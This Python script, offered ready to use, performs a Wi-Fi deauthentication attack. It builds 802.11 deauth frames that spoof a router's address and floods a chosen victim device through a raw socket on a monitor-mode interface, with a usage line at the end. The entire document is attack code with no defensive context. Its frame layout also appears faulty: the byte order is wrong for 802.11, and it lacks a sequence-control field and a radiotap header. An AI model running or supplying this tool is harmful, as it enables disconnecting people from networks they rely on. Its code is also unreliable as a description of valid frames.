import socket
import struct
import time

def create_raw_socket(interface="wlan0mon"):
    """Creates a raw socket for sending Wi-Fi packets."""
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
    sock.bind((interface, 0))
    return sock

def craft_deauth(target_mac, router_mac):
    """Creates a deauth frame."""
    deauth_frame = struct.pack(
        "!HH6s6s6sH",
        0x00C0,  # Frame Control: Deauth
        0x0000,  # Duration
        bytes.fromhex(target_mac.replace(":", "")),  # Destination (victim)
        bytes.fromhex(router_mac.replace(":", "")),  # Source (AP)
        bytes.fromhex(router_mac.replace(":", "")),  # BSSID (AP)
        0x0007   # Reason Code: Class 3 frame received from nonassociated STA
    )
    return deauth_frame

def send_deauth(target_mac, router_mac, count=100, interval=0.1, interface="wlan0mon"):
    """Sends deauth packets to a target MAC."""
    sock = create_raw_socket(interface)
    deauth_pkt = craft_deauth(target_mac, router_mac)

    for _ in range(count):
        sock.send(deauth_pkt)
        time.sleep(interval)
    print("Deauthentication attack completed.")

# Usage: send_deauth("AA:BB:CC:DD:EE:FF", "11:22:33:44:55:66")
